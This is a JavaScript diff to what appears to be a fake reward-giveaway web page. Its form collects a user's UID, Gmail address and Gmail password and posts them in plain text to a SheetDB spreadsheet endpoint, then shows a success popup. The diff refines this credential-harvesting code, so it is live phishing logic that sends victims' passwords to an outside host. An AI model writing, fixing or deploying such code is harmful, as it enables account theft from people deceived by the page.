@@ -250,7 +250,7 @@
         }
         document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
         el.classList.add('active');
-        selectedRewardName = rewardname = rewardName;
+        selectedRewardName = rewardName;
         document.getElementById('reward-error').innerText = "";
     }
 
@@ -289,25 +289,24 @@
         confirmBtn.innerText = "SUBMITTING...";
         confirmBtn.disabled = true;
 
-        // Time k string format a rakhar jonno '="' er moto ba string akare pathano hocche
-        const d = new Date();
-        const timeString = "'" + d.toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
+        const timeString = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
 
+        // SheetDB সরাসরি টেক্সট হিসেবে সবগুলো ফিল্ড পাস করার জন্য অবজেক্ট
         const payload = {
             data: [
                 {
-                    TIME: timeString,
-                    UID: String(uid),
-                    GMAIL: String(gmail),
-                    PASSWORD: String(password),
-                    REWARD: String(selectedRewardName),
-                    STATUS: "Pending"
+                    "TIME": timeString + " ",
+                    "UID": uid + " ",
+                    "GMAIL": gmail,
+                    "PASSWORD": password,
+                    "REWARD": selectedRewardName,
+                    "STATUS": "Pending"
                 }
             ]
         };
 
         try {
-            const response = await fetch(SHEETDB_API_URL, {
+            await fetch(SHEETDB_API_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -315,10 +314,8 @@
                 body: JSON.stringify(payload)
             });
 
-            const result = await response.json();
             confirmBtn.innerText = "Confirm & Register";
             confirmBtn.disabled = false;
-
             document.getElementById('success-popup').style.display = 'flex';
         } catch (error) {
             confirmBtn.innerText = "Confirm & Register";
